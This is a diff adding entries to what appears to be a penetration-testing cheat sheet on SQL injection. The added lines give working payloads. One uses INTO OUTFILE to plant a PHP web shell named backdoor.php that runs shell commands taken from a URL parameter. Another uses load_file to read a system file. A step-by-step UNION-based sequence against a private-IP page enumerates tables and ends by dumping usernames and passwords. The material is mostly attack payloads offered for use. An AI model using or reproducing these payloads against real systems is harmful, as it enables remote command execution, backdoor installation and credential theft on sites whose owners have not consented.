@@ -63,6 +63,34 @@ SELECT
 INTO OUTFILE 'C:/wamp/www/uploader.php';
 ```
 
+Upload php command injection.
+
+```bash
+union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
+```
+
+Load file.
+
+```bash
+union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
+```
+
+Inside URL:
+
+```bash
+http://192.168.11.35/comment.php?id=738 order by 1
+http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,5,6
+http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,@@version,6
+# To!discover!the!current!user!being!used!for!the!database!connection:
+http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,user(),6
+# View the tables
+http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables
+# Look into users table
+http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'
+# Extract username and password
+http://192.168.11.35/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users
+```
+
 ##### Notes
 
 - If you have a valid password, try using that same password for the admin accounts (root)
